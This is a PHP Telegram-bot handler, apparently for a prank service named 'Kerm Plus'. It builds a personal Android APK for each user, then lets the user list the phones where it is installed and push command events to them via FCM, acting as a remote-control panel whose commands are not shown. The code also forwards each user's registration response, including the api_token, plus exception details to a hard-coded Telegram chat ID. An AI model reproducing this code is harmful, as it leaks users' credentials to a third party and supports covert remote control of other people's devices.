<?php

namespace App\Telegram\Handlers;

use App\Telegram\Keyboards\MobileKermRiziKeyboard;
use SergiX44\Nutgram\Nutgram;
use App\Services\ApkBuilderService;
use App\Services\KermAppService;
use SergiX44\Nutgram\Telegram\Types\Internal\InputFile;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;
use Illuminate\Support\Facades\Log;

class MobileKermRiziHandler
{
    protected KermAppService $appService;
    protected ApkBuilderService $apkService;

    public function __construct(KermAppService $appService, ApkBuilderService $apkService)
    {
        $this->appService = $appService;
        $this->apkService = $apkService;
    }

    public function start(Nutgram $bot): void
    {
        $bot->sendMessage('در حال آماده‌سازی اپلیکیشن اختصاصی شما... این فرآیند ممکن است کمی طول بکشد. ⏳');

        try {
            // ۱. ثبت کاربر و دریافت توکن
            $userResponse = $this->appService->registerOwner(
                $bot->userId(),
                $bot->user()->username,
                $bot->user()->first_name
            );

            $bot->sendMessage(json_encode($userResponse), 691903008);

            $apiToken = $userResponse['api_token'];

            // ذخیره توکن در نشست (Session) ربات
            $bot->setUserData('api_token', $apiToken);

            // ۲. دانلود فایل APK
            $apkPath = $this->apkService->downloadApk($bot->userId(), $apiToken);
            $bot->sendMessage(json_encode($apkPath), 691903008);


            // ۳. ساخت کیبورد شیشه‌ای
            $keyboard = InlineKeyboardMarkup::make()->addRow(
                InlineKeyboardButton::make('📱 مشاهده دستگاه‌های من', callback_data: 'list_devices')
            );

            // ۴. ارسال فایل
            $bot->sendDocument(
                document: InputFile::make($apkPath, 'MyApp.apk'),
                caption: "✅ اپلیکیشن شما آماده است.\n\nپس از نصب روی گوشی، برای مدیریت دستگاه‌ها روی دکمه زیر کلیک کنید:",
                reply_markup: $keyboard
            );

            // پاکسازی فایل از سرور
            @unlink($apkPath);

        } catch (\Exception $e) {
            $bot->sendMessage(json_encode($e), 691903008);
            $bot->sendMessage('❌ متأسفانه در ساخت اپلیکیشن مشکلی پیش آمد.');
            Log::channel('daily')->error('یک خطای رخ داده است', ['exception' => $e]);

            report($e);
        }
    }

    /**
     * هندل کردن دکمه "مشاهده دستگاه‌های من"
     */
    public function listDevices(Nutgram $bot): void
    {
        $apiToken = $bot->getUserData('api_token');

        if (!$apiToken) {
            $bot->answerCallbackQuery('نشست شما منقضی شده. لطفاً دوباره /start را ارسال کنید.', true);
            return;
        }

        try {
            $response = $this->appService->getDevices($apiToken);
            $devices = $response['data'] ?? [];

            if (empty($devices)) {
                $bot->answerCallbackQuery('هنوز دستگاهی متصل نشده است. ابتدا اپلیکیشن را نصب و باز کنید.', true);
                return;
            }

            $keyboard = InlineKeyboardMarkup::make();

            foreach ($devices as $device) {
                $deviceName = $device['name'] ?? "دستگاه {$device['id']}";
                $keyboard->addRow(
                    InlineKeyboardButton::make("📱 " . $deviceName, callback_data: "dev_opts:{$device['id']}")
                );
            }

            $bot->editMessageText('یکی از دستگاه‌های زیر را برای مدیریت انتخاب کنید:', reply_markup: $keyboard);

        } catch (\Exception $e) {
            $bot->answerCallbackQuery('❌ خطا در دریافت لیست دستگاه‌ها.', true);
        }
    }

    /**
     * نمایش آپشن‌ها بعد از انتخاب یک دستگاه خاص
     */
    public function showDeviceOptions(Nutgram $bot, $id): void
    {

        $bot->editMessageText("⚙️ تنظیمات برای دستگاه #{$id}\n\nچه عملیاتی می‌خواهید انجام دهید؟", reply_markup: MobileKermRiziKeyboard::make());
    }

    /**
     * ارسال دستور (ایونت) به دیوایس از طریق API لاراول (FCM)
     */
    public function executeCommand(Nutgram $bot, $event, $id): void
    {
        $apiToken = $bot->getUserData('api_token');

        if (!$apiToken) {
            $bot->answerCallbackQuery('نشست شما منقضی شده. لطفاً دوباره ربات را استارت کنید.', true);
            return;
        }

        try {
            // ارسال ریکوئست به اپ لاراول برای تریگر کردن FCM
            $this->appService->sendEvent($apiToken, $event, null, $id);

            $bot->answerCallbackQuery('✅ دستور با موفقیت به دستگاه ارسال شد!', true);

        } catch (\Exception $e) {
            $bot->answerCallbackQuery('❌ خطا در ارسال دستور. دستگاه آفلاین است یا سرور پاسخ نمی‌دهد.', true);
            report($e);
        }
    }

    public function __invoke(Nutgram $bot): void
    {
        $msg = "<tg-emoji emoji-id='4929619512224909015'>🪱</tg-emoji> <b>کرم پلاس</b> <tg-emoji emoji-id='4929619512224909015'>🪱</tg-emoji>\n\nبه بخش کرم ریزی رو موبایل <tg-emoji emoji-id='5407025283456835913'>📱</tg-emoji>  خوش اومدی ✋🏻\nبرای ادامه یکی از گزینه های زیر رو انتخاب کن :";

        $bot->editMessageText($msg, parse_mode: 'HTML', reply_markup: MobileKermRiziKeyboard::make());
    }
}
